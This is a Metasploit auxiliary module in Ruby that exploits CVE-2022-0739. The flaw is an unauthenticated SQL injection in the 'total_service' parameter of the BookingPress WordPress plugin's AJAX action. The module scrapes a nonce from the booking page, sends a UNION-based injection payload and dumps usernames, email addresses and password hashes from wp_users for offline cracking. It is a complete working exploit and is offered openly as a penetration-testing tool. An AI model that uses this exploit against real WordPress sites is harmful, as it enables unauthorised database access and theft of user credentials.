##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  NONCE_NOT_FOUND_ERROR_MSG = 'Unable to get wp-nonce as an unauthenticated user'.freeze
  GET_SQLI_OBJECT_FAILED_ERROR_MSG = 'Unable to successfully retrieve an SQLi object'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress BookingPress bookingpress_front_get_category_services SQLi',
        'Description' => %q{
          The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied data
          in the `total_service` parameter of the `bookingpress_front_get_category_services` AJAX action
          (available to unauthenticated users), prior to using it in a dynamically constructed SQL query.
          As a result, unauthenticated attackers can conduct an SQL injection attack to dump sensitive
          data from the backend database such as usernames and password hashes.

          This module uses this vulnerability to dump the list of WordPress users and their associated
          email addresses and password hashes for cracking offline.
        },
        'Author' => [
          'cydave', # Of cyllective. Discovery of bug.
          'destr4ct', # PoC Code for exploiting the bug.
          'jheysel-r7' # Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://github.com/destr4ct/CVE-2022-0739'],
          [ 'WPVDB', '388cd42d-b61a-42a4-8604-99b812db2357'],
          [ 'CVE', '2022-0739']
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2022-02-28',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'The URL of the BookingPress appointment booking page', '/bookingpress/' ])
    ])
  end

  def check
    @nonce = get_user_nonce
    return Exploit::CheckCode::Unknown(NONCE_NOT_FOUND_ERROR_MSG) if @nonce == NONCE_NOT_FOUND_ERROR_MSG

    @sqli = get_sqli_object
    return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
    return Exploit::CheckCode::Vulnerable if @sqli.test_vulnerable

    Exploit::CheckCode::Safe
  end

  def generate_vars_post(sqli)
    {
      'action' => 'bookingpress_front_get_category_services', # Vulnerable AJAX action
      '_wpnonce' => @nonce,
      'category_id' => 1,
      'total_service' => "#{rand(100..10000)}#{sqli}"
    }
  end

  def get_sqli_object
    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
        'vars_post' =>
            generate_vars_post(") UNION ALL SELECT (#{payload}),456,789,12,34,56,78,90,77 from wp_users-- -")
      })

      if res && res.code == 200
        json_doc = res.get_json_document
        if json_doc.blank? || json_doc[0].blank?
          print_error('Could not parse the JSON response returned from the SQLi attempt!')
          return GET_SQLI_OBJECT_FAILED_ERROR_MSG
        end

        json_parsed_doc = json_doc[0]['bookingpress_service_id']
        if json_parsed_doc.blank?
          print_error('Was able to parse the JSON response but no bookingpress_service_id field was found!')
          return GET_SQLI_OBJECT_FAILED_ERROR_MSG
        end

        json_parsed_doc
      elsif res
        print_error("Unexpected response code encountered when conducting the SQLi attempt: #{res.code}")
        return GET_SQLI_OBJECT_FAILED_ERROR_MSG
      else
        print_error('No response from SQLi attempt')
        return GET_SQLI_OBJECT_FAILED_ERROR_MSG
      end
    end
  end

  def get_user_nonce
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'])
    })

    return NONCE_NOT_FOUND_ERROR_MSG unless res&.body&.match("_wpnonce:'(\\w+)'\\s*};")

    ::Regexp.last_match(1)
  end

  def run
    @nonce ||= get_user_nonce
    fail_with(Failure::UnexpectedReply, NONCE_NOT_FOUND_ERROR_MSG) if @nonce == NONCE_NOT_FOUND_ERROR_MSG
    @sqli ||= get_sqli_object
    fail_with(Failure::UnexpectedReply, GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG

    creds_table = Rex::Text::Table.new(
      'Header' => 'Wordpress User Credentials',
      'Indent' => 1,
      'Columns' => ['Username', 'Email', 'Hash']
    )

    print_status('Extracting credential information')
    users = @sqli.dump_table_fields('wp_users', %w[user_login user_email user_pass])

    users.each do |(username, email, hash)|
      creds_table << [username, email, hash]
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
        private_data: hash,
        service_name: 'WordPress BookingPress Plugin',
        address: datastore['RHOSTS'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED,
        email: email
      })
    end
    print_line creds_table.to_s
  end
end
